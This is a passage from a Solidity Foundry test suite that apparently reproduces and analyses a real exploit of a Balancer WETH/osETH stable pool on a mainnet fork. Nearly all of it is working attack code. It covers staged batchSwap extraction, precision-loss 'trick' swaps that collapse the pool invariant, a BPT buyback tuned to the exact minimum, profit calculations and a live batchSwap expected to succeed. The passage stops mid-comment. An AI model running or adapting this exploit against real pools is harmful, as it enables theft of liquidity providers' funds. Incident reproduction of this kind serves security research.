            if (tokenIndex == 0) { bW += amountIn; wethCost += amountIn; }
            else { bO += amountIn; osethCost += amountIn; }
            supply += bptAmounts[i];
            uint256 feeBpt = _calcProtocolFeeBpt(preInvariant, preSupply, postInv, supply);
            supply += feeBpt;
            console.log("[SP]   supply after:", supply);
            console.log("[SP]   feeBpt:", feeBpt);
            console.log("[SP]   preInv:", preInvariant, "postInv:", postInv);
            storedInvariant = postInv;
        }
    }

    function _simulateStep3RepaymentDetailed(
        uint256 balWETH,
        uint256 balOSETH,
        uint256 bptToBuy,
        uint256 virtualSupply,
        uint256 initialStoredInvariant
    ) internal view returns (uint256 wethCost, uint256 osethCost, uint256 totalBptBought) {
        (uint256[] memory bptAmounts, uint256 swapCount) = _generateStep3Amounts(bptToBuy, 20);

        uint256 bW = balWETH;
        uint256 bO = balOSETH;
        uint256 supply = virtualSupply;

        uint256 storedInvariant = initialStoredInvariant;
        for (uint256 i = 0; i < swapCount; i++) {
            totalBptBought += bptAmounts[i];
            uint256 preInvariant = _getInvariant(bW, bO);
            supply += _calcBeforeSwapFeeBpt(preInvariant, storedInvariant, supply);
            uint256 preSupply = supply;
            uint256[] memory bal = new uint256[](2);
            uint256[] memory scalingFactors = new uint256[](2);
            bal[0] = bW; bal[1] = bO;
            scalingFactors[0] = sf[0]; scalingFactors[1] = sf[1];
            uint256 tokenIndex = i % 2 == 0 ? 0 : 1;
            (uint256 amountIn, uint256 postInv) = swapMath.getTokenInForBptOutAndPostInvariant(bal, scalingFactors, tokenIndex, bptAmounts[i], supply, amp, swapFeePercentage);
            if (tokenIndex == 0) { bW += amountIn; wethCost += amountIn; }
            else { bO += amountIn; osethCost += amountIn; }
            supply += bptAmounts[i];
            supply += _calcProtocolFeeBpt(preInvariant, preSupply, postInv, supply);
            storedInvariant = postInv;
        }
    }

    function test_detailedTokenBreakdown() public {
        uint256 trickAmt = FixedPoint.ONE / (sf[1] - FixedPoint.ONE);
        bytes32 poolId = OSETH_BPT.getPoolId();
        (, uint256[] memory realBal,) = VAULT.getPoolTokens(poolId);
        uint256 realWETH = realBal[0];
        uint256 realOSETH = realBal[2];
        uint256 totalBPT = OSETH_BPT.getActualSupply();

        uint256 remain = 67000;
        uint256 N = 30;

        // Diagnostic: compare lastStoredInvariant vs fresh _getInvariant
        (, uint256 lastStoredInvariant) = OSETH_BPT.getLastJoinExitData();
        uint256 freshInvariant = _getInvariant(realWETH, realOSETH);
        console.log("[SP] lastStoredInvariant (getLastJoinExitData):", lastStoredInvariant);
        console.log("[SP] freshInvariant (_getInvariant):", freshInvariant);
        console.log("[SP] diff (stored - fresh):", lastStoredInvariant > freshInvariant ? lastStoredInvariant - freshInvariant : 0);
        console.log("[SP] diff (fresh - stored):", freshInvariant > lastStoredInvariant ? freshInvariant - lastStoredInvariant : 0);

        // Diagnostic: yield fee that the real Balancer mints before the first swap
        // Per IBasePool.sol comment: SWAP=0, AUM=1, YIELD=2
        uint256 protocolYieldFeePercentage = OSETH_BPT.getProtocolFeePercentageCache(2);
        console.log("[SP] protocolYieldFeePercentage (type 1):", protocolYieldFeePercentage);
        console.log("[SP] protocolSwapFeePercentage  (type 0):", protocolSwapFeePercentage);
        console.log("[SP] totalBPT:", totalBPT);
        if (freshInvariant > lastStoredInvariant && protocolYieldFeePercentage > 0) {
            uint256 delta = freshInvariant - lastStoredInvariant;
            // yieldOwnership = delta / freshInvariant * yieldFeePercentage  (FixedPoint.mulDown(divDown))
            uint256 yieldOwnership = (delta * FixedPoint.ONE / freshInvariant) * protocolYieldFeePercentage / FixedPoint.ONE;
            // yieldFeeBpt = supply * yieldOwnership / complement(yieldOwnership)
            uint256 yieldFeeBpt = totalBPT * yieldOwnership / yieldOwnership.complement();
            console.log("[SP] yieldOwnership:", yieldOwnership);
            console.log("[SP] yieldFeeBpt (pre-Phase1 minting):", yieldFeeBpt);
        } else {
            console.log("[SP] yieldFeeBpt: 0 (no yield fee or fee rate is 0)");
        }

        console.log("=== DETAILED TOKEN BREAKDOWN: remain=67000, N=30 ===");

        // Step 1: extract tokens (per-token)
        // The attacker's total BPT debt (bptSold) consists of two parts:
        //   bptSold = (actualSupply - finalSupply) + totalFeeBpt
        //   1. actualSupply - finalSupply: BPT shares genuinely redeemed from the pool
        //   2. totalFeeBpt: extra BPT cost caused by protocol fee minting inflating virtualSupply
        Step1DetailedResult memory s1 =
            _simulateStep1ExtractionDetailed(realWETH, realOSETH, remain, totalBPT);
        uint256 wethOut = s1.totalWethOut;
        uint256 osethOut = s1.totalOsethOut;
        uint256 bptSold = s1.totalBptSold;
        uint256 postStep1Supply = s1.remainingSupply;
        uint256 phase1Invariant = s1.lastPostJoinExitInvariant;
        console.log("--- Step 1: Token Extraction ---");
        console.log("WETH extracted:", wethOut);
        console.log("osETH extracted:", osethOut);
        console.log("BPT sold:", bptSold);
        console.log("[SP] phase1 lastPostJoinExitInvariant:", phase1Invariant);

        // Step 2: D-collapse cycling (per-token costs)
        // Token↔token swaps do NOT update _lastPostJoinExitInvariant in the real contract
        uint256 bW = remain; uint256 bO = remain;
        console.log("--- Step 2: D-Collapse Cycling ---");
        console.log("[SP] trickAmt:", trickAmt);
        console.log("[SP] sf[0]:", sf[0]);
        console.log("[SP] sf[1]:", sf[1]);
        for (uint256 r = 0; r < N; r++) {
            (bW, bO) = this.simulateOneRound(bW, bO, trickAmt);
            console.log("[SP] Round:", r);
            console.log("[SP]   bW:", bW);
            console.log("[SP]   bO:", bO);
        }
        // Pool WETH dropped from remain→bW; that difference flowed to attacker (GAIN, not cost)
        uint256 wethGainStep2 = remain - bW;
        uint256 osethGainStep2 = remain - bO;
        console.log("--- Step 2: D-Collapse Cycling ---");
        console.log("WETH gained from pool:", wethGainStep2);
        console.log("osETH gained from pool:", osethGainStep2);

        // Print pre-Phase3 internal balances (matching EXP format)
        console.log("[SP] wethInternal before Phase3:", wethOut + wethGainStep2);
        console.log("[SP] osethInternal before Phase3:", osethOut + osethGainStep2);
        console.log("[SP] postStep1Supply:", postStep1Supply);
        console.log("[SP] bW after cycling:", bW);
        console.log("[SP] bO after cycling:", bO);

        // Step 3: BPT buyback (per-token costs) - use debug version for per-step logging
        // Use minimum bptTarget = minBuyback - warmupSum - 2 to test if attack still succeeds
        // uint256 bptTarget = 11838483978630598473877;
        uint256 bptTarget = totalBPT * 10030 / 10000;
        (uint256 wethCostStep3, uint256 osethCostStep3, uint256 bptBought) =
            _simulateStep3RepaymentDetailedWithLog(bW, bO, bptTarget, postStep1Supply, phase1Invariant);
        console.log("--- Step 3: BPT Buyback ---");
        console.log("[SP] Phase3 WETH cost:", wethCostStep3);
        console.log("[SP] Phase3 osETH cost:", osethCostStep3);
        console.log("WETH spent on buyback:", wethCostStep3);
        console.log("osETH spent on buyback:", osethCostStep3);
        console.log("bptTarget:", bptTarget);
        console.log("BPT bought back:", bptBought);
        console.log("[SP] wethInternal after Phase3:", wethOut + wethGainStep2 - wethCostStep3);
        console.log("[SP] osethInternal after Phase3:", osethOut + osethGainStep2 - osethCostStep3);

        // Net token deltas: Phase1 extraction + Phase2 cycling gain - Phase3 buyback cost
        uint256 netWeth = wethOut + wethGainStep2 - wethCostStep3;
        uint256 netOseth = osethOut + osethGainStep2 - osethCostStep3;
        int256 netBpt = int256(bptBought) - int256(bptSold);

        console.log("=== NET TOKEN DELTAS ===");
        console.log("Net WETH (wei):", netWeth);
        console.log("Net WETH (ETH):", netWeth / 1e18);
        console.log("Net osETH (wei):", netOseth);
        console.log("Net osETH (ETH):", netOseth / 1e18);
        console.log("Net BPT (wei):", netBpt);
        console.log("Net BPT (ETH):", netBpt / 1e18);
        console.log("Total profit (wei):", netWeth + netOseth);
        console.log("Total profit (ETH):", (netWeth + netOseth) / 1e18);

        console.log("=== REAL ATTACK COMPARISON ===");
        console.log("Real WETH:  6587.44 ETH");
        console.log("Real osETH: 6851.12 ETH");
        console.log("Real BPT:   44.15 ETH");
    }

    /// @notice Build Phase 2 trick swap steps (token↔token to collapse D).
    /// Returns a BatchSwapStep array and the post-Phase2 simulated balances.
    function _buildPhase2Steps(
        bytes32 poolId,
        uint256 initBalance,
        uint256 trickAmt,
        uint256 maxRounds
    ) internal returns (IVault.BatchSwapStep[] memory steps, uint256 finalBalW, uint256 finalBalO) {
        IVault.BatchSwapStep[] memory buffer = new IVault.BatchSwapStep[](maxRounds * 3);
        uint256 stepCount = 0;

        uint256 bW = initBalance;
        uint256 bO = initBalance;
        uint256 amount = bO;

        for (uint256 round = 0; round < maxRounds; round++) {
            // Swap 1: WETH→osETH, extract (amount - trickAmt - 1) of osETH
            uint256 out1 = amount - trickAmt - 1;
            uint256[] memory bal = new uint256[](2);
            uint256[] memory sfs = new uint256[](2);
            bal[0] = bW; bal[1] = bO; sfs[0] = sf[0]; sfs[1] = sf[1];
            bal = swapMath.getAfterSwapOutBalances(bal, sfs, 0, 1, out1, amp, swapFeePercentage);
            bW = bal[0]; bO = bal[1];
            buffer[stepCount++] = IVault.BatchSwapStep({
                poolId: poolId, assetInIndex: 0, assetOutIndex: 2, amount: out1, userData: bytes("")
            });

            // Swap 2: WETH→osETH, extract trickAmt (precision loss trigger)
            bal[0] = bW; bal[1] = bO; sfs[0] = sf[0]; sfs[1] = sf[1];
            bal = swapMath.getAfterSwapOutBalances(bal, sfs, 0, 1, trickAmt, amp, swapFeePercentage);
            bW = bal[0]; bO = bal[1];
            buffer[stepCount++] = IVault.BatchSwapStep({
                poolId: poolId, assetInIndex: 0, assetOutIndex: 2, amount: trickAmt, userData: bytes("")
            });

            // Swap 3: osETH→WETH, extract truncated WETH balance
            uint256 out3 = _truncateToTop2Digits(bW);
            bool swapped = false;
            for (uint256 j = 0; j < 3; j++) {
                bal[0] = bW; bal[1] = bO; sfs[0] = sf[0]; sfs[1] = sf[1];
                try swapMath.getAfterSwapOutBalances(bal, sfs, 1, 0, out3, amp, swapFeePercentage)
                    returns (uint256[] memory newBal)
                {
                    bW = newBal[0]; bO = newBal[1];
                    buffer[stepCount++] = IVault.BatchSwapStep({
                        poolId: poolId, assetInIndex: 2, assetOutIndex: 0, amount: out3, userData: bytes("")
                    });
                    amount = bO;
                    swapped = true;
                    break;
                } catch {
                    out3 = out3 * 9 / 10;
                }
            }
            require(swapped, "Phase2 swap3 failed");
        }

        // Trim buffer to actual step count
        steps = new IVault.BatchSwapStep[](stepCount);
        for (uint256 i = 0; i < stepCount; i++) steps[i] = buffer[i];
        finalBalW = bW;
        finalBalO = bO;
    }

    /// @notice Demonstrates that batchSwap reverts when Phase 3 buys back fewer BPT
    /// than Phase 1 sold — includes all 3 phases with Phase 3 deliberately insufficient.
    function test_batchSwapRevertOnInsufficientBptRepayment() public {
        bytes32 poolId = OSETH_BPT.getPoolId();
        uint256 BptIndex = OSETH_BPT.getBptIndex(); // = 1
        (IERC20[] memory tokens, uint256[] memory balances,) = VAULT.getPoolTokens(poolId);

        uint256 remain = 67000;
        uint256 trickAmt = FixedPoint.ONE / (sf[1] - FixedPoint.ONE);

        // --- Phase 1: BPT → token exits ---
        (uint256[] memory wethAmounts, uint256 wethCount) = _generateStep1Amounts(balances[0], remain, 15);
        (uint256[] memory osethAmounts, uint256 osethCount) = _generateStep1Amounts(balances[2], remain, 15);
        uint256 maxSwaps = wethCount > osethCount ? wethCount : osethCount;
        uint256 phase1Count = 0;
        for (uint256 i = 0; i < maxSwaps; i++) {
            if (i < wethCount) phase1Count++;
            if (i < osethCount) phase1Count++;
        }

        // --- Phase 2: trick swaps to collapse D ---
        (IVault.BatchSwapStep[] memory phase2Steps,,) = _buildPhase2Steps(poolId, remain, trickAmt, 30);

        // --- Phase 3: ONLY warmup steps (1e4 → 1e19), deliberately insufficient ---
        // Total warmup = 1e4 + 1e7 + 1e10 + 1e13 + 1e16 + 1e19 ≈ 1.001e19 ≈ 10 BPT
        // Phase 1 sold ≈ 11,848 BPT → massive shortfall
        uint256 phase3Count = 6;
        IVault.BatchSwapStep[] memory phase3Steps = new IVault.BatchSwapStep[](phase3Count);
        uint256 warmupAmt = 1e4;
        bool useAsset0 = true;
        for (uint256 i = 0; i < phase3Count; i++) {
            phase3Steps[i] = IVault.BatchSwapStep({
                poolId: poolId,
                assetInIndex: useAsset0 ? 0 : 2,
                assetOutIndex: BptIndex,
                amount: warmupAmt,
                userData: bytes("")
            });
            warmupAmt = warmupAmt * 1e3;
            useAsset0 = !useAsset0;
        }

        // --- Concatenate all phases ---
        uint256 totalSteps = phase1Count + phase2Steps.length + phase3Count;
        IVault.BatchSwapStep[] memory allSteps = new IVault.BatchSwapStep[](totalSteps);
        uint256 idx = 0;

        // Phase 1
        for (uint256 i = 0; i < maxSwaps; i++) {
            if (i < wethCount) {
                allSteps[idx++] = IVault.BatchSwapStep({
                    poolId: poolId, assetInIndex: BptIndex, assetOutIndex: 0,
                    amount: wethAmounts[i], userData: bytes("")
                });
            }
            if (i < osethCount) {
                allSteps[idx++] = IVault.BatchSwapStep({
                    poolId: poolId, assetInIndex: BptIndex, assetOutIndex: 2,
                    amount: osethAmounts[i], userData: bytes("")
                });
            }
        }
        // Phase 2
        for (uint256 i = 0; i < phase2Steps.length; i++) allSteps[idx++] = phase2Steps[i];
        // Phase 3
        for (uint256 i = 0; i < phase3Count; i++) allSteps[idx++] = phase3Steps[i];

        // Approve & setup
        for (uint256 i = 0; i < tokens.length; i++) {
            tokens[i].approve(address(VAULT), type(uint256).max);
        }
        int256[] memory limits = new int256[](3);
        limits[0] = type(int256).max;
        limits[1] = type(int256).max;
        limits[2] = type(int256).max;

        IVault.FundManagement memory funds = IVault.FundManagement({
            sender: address(this),
            fromInternalBalance: false,
            recipient: payable(address(this)),
            toInternalBalance: false
        });

        console.log("=== batchSwap with insufficient BPT repayment ===");
        console.log("Phase 1 steps:", phase1Count);
        console.log("Phase 2 steps:", phase2Steps.length);
        console.log("Phase 3 steps (warmup only):", phase3Count);
        console.log("Test contract BPT balance:", IERC20(address(OSETH_BPT)).balanceOf(address(this)));

        // Should revert with BAL#416 (TRANSFER_FROM_FAILED):
        //   Phase 1 sells ~11,848 BPT → assetDeltas[BPT] ≈ +11,848
        //   Phase 3 buys back only ~10 BPT (warmup only) → assetDeltas[BPT] ≈ +11,838
        //   Settlement: Vault calls BPT.transferFrom(user, vault, 11838e18) → fails (user has 0 BPT)
        vm.expectRevert();
        VAULT.batchSwap(IVault.SwapKind.GIVEN_OUT, allSteps, tokens, funds, limits, block.timestamp);
        console.log("Reverted with BAL#416 (TRANSFER_FROM_FAILED) as expected");
    }

    /// @notice Find the exact minimum Phase 3 BPT buyback needed for the attack to succeed.
    /// Uses queryBatchSwap to get the precise BPT delta from Phase 1+2, then compares
    /// with the attacker's bptTarget formula.
    function test_minimumPhase3Buyback() public {
        bytes32 poolId = OSETH_BPT.getPoolId();
        uint256 BptIndex = OSETH_BPT.getBptIndex(); // = 1
        (IERC20[] memory tokens, uint256[] memory balances,) = VAULT.getPoolTokens(poolId);
        uint256 totalBPT = OSETH_BPT.getActualSupply();

        uint256 remain = 67000;
        uint256 trickAmt = FixedPoint.ONE / (sf[1] - FixedPoint.ONE);

        // --- Phase 1 steps ---
        (uint256[] memory wethAmounts, uint256 wethCount) = _generateStep1Amounts(balances[0], remain, 15);
        (uint256[] memory osethAmounts, uint256 osethCount) = _generateStep1Amounts(balances[2], remain, 15);
        uint256 maxSwaps = wethCount > osethCount ? wethCount : osethCount;
        uint256 phase1Count = 0;
        for (uint256 i = 0; i < maxSwaps; i++) {
            if (i < wethCount) phase1Count++;
            if (i < osethCount) phase1Count++;
        }

        // --- Phase 2 steps ---
        (IVault.BatchSwapStep[] memory phase2Steps,,) = _buildPhase2Steps(poolId, remain, trickAmt, 30);

        // --- Build Phase 1 + Phase 2 combined ---
        uint256 totalP12 = phase1Count + phase2Steps.length;
        IVault.BatchSwapStep[] memory stepsP12 = new IVault.BatchSwapStep[](totalP12);
        uint256 idx = 0;
        for (uint256 i = 0; i < maxSwaps; i++) {
            if (i < wethCount) {
                stepsP12[idx++] = IVault.BatchSwapStep({
                    poolId: poolId, assetInIndex: BptIndex, assetOutIndex: 0,
                    amount: wethAmounts[i], userData: bytes("")
                });
            }
            if (i < osethCount) {
                stepsP12[idx++] = IVault.BatchSwapStep({
                    poolId: poolId, assetInIndex: BptIndex, assetOutIndex: 2,
                    amount: osethAmounts[i], userData: bytes("")
                });
            }
        }
        for (uint256 i = 0; i < phase2Steps.length; i++) stepsP12[idx++] = phase2Steps[i];

        // Convert IERC20[] to address[] for queryBatchSwap
        address[] memory assets = new address[](tokens.length);
        for (uint256 i = 0; i < tokens.length; i++) assets[i] = address(tokens[i]);

        IVault.FundManagement memory funds = IVault.FundManagement({
            sender: address(this),
            fromInternalBalance: false,
            recipient: payable(address(this)),
            toInternalBalance: false
        });

        // Query Phase 1+2 deltas
        int256[] memory deltas = VAULT.queryBatchSwap(
            IVault.SwapKind.GIVEN_OUT, stepsP12, assets, funds
        );

        int256 bptDelta = deltas[BptIndex]; // positive = user owes BPT
        console.log("=== MINIMUM PHASE 3 BUYBACK ANALYSIS ===");
        console.log("Phase 1+2 BPT delta (user owes):");
        console.logInt(bptDelta);

        // This BPT delta IS the minimum Phase 3 buyback needed
        uint256 minBuyback = uint256(bptDelta);
        console.log("Minimum Phase 3 BPT buyback:", minBuyback);

        // Compare with simulation
        uint256 bptSold = _simulateStep1ExtractionDetailed(balances[0], balances[2], remain, totalBPT).totalBptSold;
        console.log("Simulation BPT sold (Phase 1):", bptSold);

        // Compare with attacker's bptTarget formula
        uint256 bptTarget = totalBPT * 10030 / 10000;
        console.log("Attacker bptTarget (actualSupply*10030/10000):", bptTarget);
        console.log("actualSupply:", totalBPT);

        // Warmup sum from _generateStep3Amounts
        uint256 warmupSum = 1e4 + 1e7 + 1e10 + 1e13 + 1e16 + 1e19;
        console.log("Phase 3 warmup sum:", warmupSum);

        // Total BPT bought = bptTarget + warmupSum + 2 (from _generateStep3Amounts)
        uint256 totalBptBought = bptTarget + warmupSum + 2;
        console.log("Total BPT bought (with warmup):", totalBptBought);

        // Margin
        console.log("=== MARGINS ===");
        console.log("Margin: bptTarget - minBuyback =");
        if (bptTarget > minBuyback) {
            console.log("  +", bptTarget - minBuyback);
        } else {
            console.log("  -", minBuyback - bptTarget);
        }
        console.log("Margin: totalBptBought - minBuyback =");
        console.log("  +", totalBptBought - minBuyback);

        // Minimum bptTarget for _generateStep3Amounts (subtract warmup overhead)
        uint256 minBptTarget = minBuyback > warmupSum + 2 ? minBuyback - warmupSum - 2 : 0;
        console.log("Minimum bptTarget for simulation:", minBptTarget);
        console.log("Actual bptTarget:", bptTarget);
        console.log("Excess bptTarget:", bptTarget - minBptTarget);
    }

    /// @notice Use queryBatchSwap to verify whether the minimum bptTarget actually
    /// settles the BPT debt. This calls the real Vault (read-only) so it captures
    /// the true assetDeltas including protocol fees and rounding.
    function test_queryBatchSwapWithMinBptTarget() public {
        bytes32 poolId = OSETH_BPT.getPoolId();
        uint256 BptIndex = OSETH_BPT.getBptIndex(); // = 1
        (IERC20[] memory tokens, uint256[] memory balances,) = VAULT.getPoolTokens(poolId);

        uint256 remain = 67000;
        uint256 trickAmt = FixedPoint.ONE / (sf[1] - FixedPoint.ONE);

        // --- Phase 1 steps ---
        (uint256[] memory wethAmounts, uint256 wethCount) = _generateStep1Amounts(balances[0], remain, 15);
        (uint256[] memory osethAmounts, uint256 osethCount) = _generateStep1Amounts(balances[2], remain, 15);
        uint256 maxSwaps = wethCount > osethCount ? wethCount : osethCount;
        uint256 phase1Count = 0;
        for (uint256 i = 0; i < maxSwaps; i++) {
            if (i < wethCount) phase1Count++;
            if (i < osethCount) phase1Count++;
        }

        // --- Phase 2 steps ---
        (IVault.BatchSwapStep[] memory phase2Steps,,) = _buildPhase2Steps(poolId, remain, trickAmt, 30);

        // --- Phase 3 steps with MINIMUM bptTarget ---
        uint256 minBptTarget = 11838483978630598473877;
        (uint256[] memory step3Amounts, uint256 step3Count) = _generateStep3Amounts(minBptTarget, 20);
        uint256 phase3Count = step3Count;

        // --- Concatenate all phases ---
        uint256 totalSteps = phase1Count + phase2Steps.length + phase3Count;
        IVault.BatchSwapStep[] memory allSteps = new IVault.BatchSwapStep[](totalSteps);
        uint256 idx = 0;

        // Phase 1
        for (uint256 i = 0; i < maxSwaps; i++) {
            if (i < wethCount) {
                allSteps[idx++] = IVault.BatchSwapStep({
                    poolId: poolId, assetInIndex: BptIndex, assetOutIndex: 0,
                    amount: wethAmounts[i], userData: bytes("")
                });
            }
            if (i < osethCount) {
                allSteps[idx++] = IVault.BatchSwapStep({
                    poolId: poolId, assetInIndex: BptIndex, assetOutIndex: 2,
                    amount: osethAmounts[i], userData: bytes("")
                });
            }
        }
        // Phase 2
        for (uint256 i = 0; i < phase2Steps.length; i++) allSteps[idx++] = phase2Steps[i];
        // Phase 3: alternating WETH(0)/osETH(2) → BPT(1)
        bool useAsset0 = true;
        for (uint256 i = 0; i < phase3Count; i++) {
            allSteps[idx++] = IVault.BatchSwapStep({
                poolId: poolId,
                assetInIndex: useAsset0 ? 0 : 2,
                assetOutIndex: BptIndex,
                amount: step3Amounts[i],
                userData: bytes("")
            });
            useAsset0 = !useAsset0;
        }

        // Convert IERC20[] to address[] for queryBatchSwap
        address[] memory assets = new address[](tokens.length);
        for (uint256 i = 0; i < tokens.length; i++) assets[i] = address(tokens[i]);

        IVault.FundManagement memory funds = IVault.FundManagement({
            sender: address(this),
            fromInternalBalance: false,
            recipient: payable(address(this)),
            toInternalBalance: false
        });

        // Query all 3 phases together
        int256[] memory deltas = VAULT.queryBatchSwap(
            IVault.SwapKind.GIVEN_OUT, allSteps, assets, funds
        );

        console.log("=== queryBatchSwap with MINIMUM bptTarget ===");
        console.log("minBptTarget:", minBptTarget);
        console.log("Phase 3 step count:", phase3Count);
        console.log("Total steps:", totalSteps);
        console.log("--- Asset Deltas ---");
        console.log("WETH delta (index 0):");
        console.logInt(deltas[0]);
        console.log("BPT delta (index 1):");
        console.logInt(deltas[1]);
        console.log("osETH delta (index 2):");
        console.logInt(deltas[2]);

        // BPT delta > 0 means user still owes BPT → attack fails
        // BPT delta <= 0 means user has surplus BPT → attack succeeds
        if (deltas[1] > 0) {
            console.log("RESULT: Attack FAILS - user still owes BPT to Vault");
            console.log("BPT shortfall:", uint256(deltas[1]));
        } else {
            console.log("RESULT: Attack SUCCEEDS - user has BPT surplus");
            console.log("BPT surplus:", uint256(-deltas[1]));
        }

        // Now test with minBptTarget + 2 (to cover the 1 wei gap)
        uint256 minBptTargetPlus2 = minBptTarget + 2;
        (uint256[] memory step3AmountsPlus, uint256 step3CountPlus) = _generateStep3Amounts(minBptTargetPlus2, 20);

        totalSteps = phase1Count + phase2Steps.length + step3CountPlus;
        IVault.BatchSwapStep[] memory allStepsPlus = new IVault.BatchSwapStep[](totalSteps);
        idx = 0;
        for (uint256 i = 0; i < maxSwaps; i++) {
            if (i < wethCount) {
                allStepsPlus[idx++] = IVault.BatchSwapStep({
                    poolId: poolId, assetInIndex: BptIndex, assetOutIndex: 0,
                    amount: wethAmounts[i], userData: bytes("")
                });
            }
            if (i < osethCount) {
                allStepsPlus[idx++] = IVault.BatchSwapStep({
                    poolId: poolId, assetInIndex: BptIndex, assetOutIndex: 2,
                    amount: osethAmounts[i], userData: bytes("")
                });
            }
        }
        for (uint256 i = 0; i < phase2Steps.length; i++) allStepsPlus[idx++] = phase2Steps[i];
        useAsset0 = true;
        for (uint256 i = 0; i < step3CountPlus; i++) {
            allStepsPlus[idx++] = IVault.BatchSwapStep({
                poolId: poolId,
                assetInIndex: useAsset0 ? 0 : 2,
                assetOutIndex: BptIndex,
                amount: step3AmountsPlus[i],
                userData: bytes("")
            });
            useAsset0 = !useAsset0;
        }

        int256[] memory deltasPlus = VAULT.queryBatchSwap(
            IVault.SwapKind.GIVEN_OUT, allStepsPlus, assets, funds
        );

        console.log("=== queryBatchSwap with minBptTarget + 2 ===");
        console.log("minBptTarget+2:", minBptTargetPlus2);
        console.log("BPT delta (index 1):");
        console.logInt(deltasPlus[1]);
        if (deltasPlus[1] > 0) {
            console.log("RESULT: Attack FAILS - user still owes BPT");
            console.log("BPT shortfall:", uint256(deltasPlus[1]));
        } else {
            console.log("RESULT: Attack SUCCEEDS - user has BPT surplus");
            console.log("BPT surplus:", uint256(-deltasPlus[1]));
        }
    }

    /// @notice Call real batchSwap with minimum bptTarget to confirm BAL#416 revert,
    /// then call with minBptTarget+2 to confirm success.
    function test_realBatchSwapMinBptTarget() public {
        bytes32 poolId = OSETH_BPT.getPoolId();
        uint256 BptIndex = OSETH_BPT.getBptIndex();
        (IERC20[] memory tokens, uint256[] memory balances,) = VAULT.getPoolTokens(poolId);

        uint256 remain = 67000;
        uint256 trickAmt = FixedPoint.ONE / (sf[1] - FixedPoint.ONE);

        // --- Phase 1 steps ---
        (uint256[] memory wethAmounts, uint256 wethCount) = _generateStep1Amounts(balances[0], remain, 15);
        (uint256[] memory osethAmounts, uint256 osethCount) = _generateStep1Amounts(balances[2], remain, 15);
        uint256 maxSwaps = wethCount > osethCount ? wethCount : osethCount;
        uint256 phase1Count = 0;
        for (uint256 i = 0; i < maxSwaps; i++) {
            if (i < wethCount) phase1Count++;
            if (i < osethCount) phase1Count++;
        }

        // --- Phase 2 steps ---
        (IVault.BatchSwapStep[] memory phase2Steps,,) = _buildPhase2Steps(poolId, remain, trickAmt, 30);

        // --- Phase 3 with MINIMUM bptTarget (should fail) ---
        uint256 minBptTarget = 11838483978630598473877;
        (uint256[] memory step3Amounts, uint256 step3Count) = _generateStep3Amounts(minBptTarget, 20);

        IVault.BatchSwapStep[] memory allSteps = _assembleAllSteps(
            poolId, BptIndex, wethAmounts, wethCount, osethAmounts, osethCount,
            maxSwaps, phase2Steps, step3Amounts, step3Count
        );

        // Approve tokens
        for (uint256 i = 0; i < tokens.length; i++) {
            tokens[i].approve(address(VAULT), type(uint256).max);
        }
        // Give test contract plenty of WETH and osETH for settlement
        deal(address(tokens[0]), address(this), 100000 ether);
        deal(address(tokens[2]), address(this), 100000 ether);

        int256[] memory limits = new int256[](3);
        limits[0] = type(int256).max;
        limits[1] = type(int256).max;
        limits[2] = type(int256).max;

        IVault.FundManagement memory funds = IVault.FundManagement({
            sender: address(this),
            fromInternalBalance: false,
            recipient: payable(address(this)),
            toInternalBalance: false
        });

        console.log("=== Real batchSwap with minBptTarget (should revert BAL#416) ===");
        console.log("Test contract BPT balance:", IERC20(address(OSETH_BPT)).balanceOf(address(this)));
        vm.expectRevert();
        VAULT.batchSwap(IVault.SwapKind.GIVEN_OUT, allSteps, tokens, funds, limits, block.timestamp);
        console.log("Reverted as expected (BAL#416)");

        // --- Phase 3 with minBptTarget + 2 (should succeed) ---
        uint256 minBptTargetOk = minBptTarget + 2;
        (uint256[] memory step3AmountsOk, uint256 step3CountOk) = _generateStep3Amounts(minBptTargetOk, 20);

        IVault.BatchSwapStep[] memory allStepsOk = _assembleAllSteps(
            poolId, BptIndex, wethAmounts, wethCount, osethAmounts, osethCount,
            maxSwaps, phase2Steps, step3AmountsOk, step3CountOk
        );

        console.log("=== Real batchSwap with minBptTarget+2 (should succeed) ===");
        int256[] memory result = VAULT.batchSwap(
            IVault.SwapKind.GIVEN_OUT, allStepsOk, tokens, funds, limits, block.timestamp
        );
        console.log("batchSwap SUCCEEDED");
        console.log("WETH delta:");
        console.logInt(result[0]);
        console.log("BPT delta:");
        console.logInt(result[1]);
        console.log("osETH delta:");
        console.logInt(result[2]);
    }

    /// @dev Helper to assemble Phase1 + Phase2 + Phase3 steps into one array
    function _assembleAllSteps(
        bytes32 poolId, uint256 BptIndex,
        uint256[] memory wethAmounts, uint256 wethCount,
        uint256[] memory osethAmounts, uint256 osethCount,
        uint256 maxSwaps,
        IVault.BatchSwapStep[] memory phase2Steps,
        uint256[] memory step3Amounts, uint256 step3Count
    ) internal pure returns (IVault.BatchSwapStep[] memory) {
        uint256 phase1Count = 0;
        for (uint256 i = 0; i < maxSwaps; i++) {
            if (i < wethCount) phase1Count++;
            if (i < osethCount) phase1Count++;
        }
        uint256 total = phase1Count + phase2Steps.length + step3Count;
        IVault.BatchSwapStep[] memory steps = new IVault.BatchSwapStep[](total);
        uint256 idx = 0;
        // Phase 1
        for (uint256 i = 0; i < maxSwaps; i++) {
            if (i < wethCount) {
                steps[idx++] = IVault.BatchSwapStep({
                    poolId: poolId, assetInIndex: BptIndex, assetOutIndex: 0,
                    amount: wethAmounts[i], userData: bytes("")
                });
            }
            if (i < osethCount) {
                steps[idx++] = IVault.BatchSwapStep({
                    poolId: poolId, assetInIndex: BptIndex, assetOutIndex: 2,
                    amount: osethAmounts[i], userData: bytes("")
                });
            }
        }
        // Phase 2
        for (uint256 i = 0; i < phase2Steps.length; i++) steps[idx++] = phase2Steps[i];
        // Phase 3
        bool useAsset0 = true;
        for (uint256 i = 0; i < step3Count; i++) {
            steps[idx++] = IVault.BatchSwapStep({
                poolId: poolId,
                assetInIndex: useAsset0 ? 0 : 2,
                assetOutIndex: BptIndex,
                amount: step3Amounts[i],
                userData: bytes("")
            });
            useAsset0 = !useAsset0;
        }
        return steps;
    }

    // ══════════════════════════════════════════════════════════════════
    // Epoch Safety Guarantee Test
    // ══════════════════════════════════════════════════════════════════

    /// @notice Actual unix timestamp of mainnet block 23717396 (cached so repeated
    /// _setupEpochOffset() calls warp from a deterministic baseline, not from whatever
    /// timestamp Foundry's snapshot-restore behavior leaves on createSelectFork).
    uint256 internal constant FORK_BLOCK_TS = 1762155995;

    /// @notice Helper: re-fork at block 23717396 and warp to FORK_BLOCK_TS + extraBlocks*12.
    ///         IMPORTANT: prior version used `vm.warp(block.timestamp + extraBlocks*12)`,
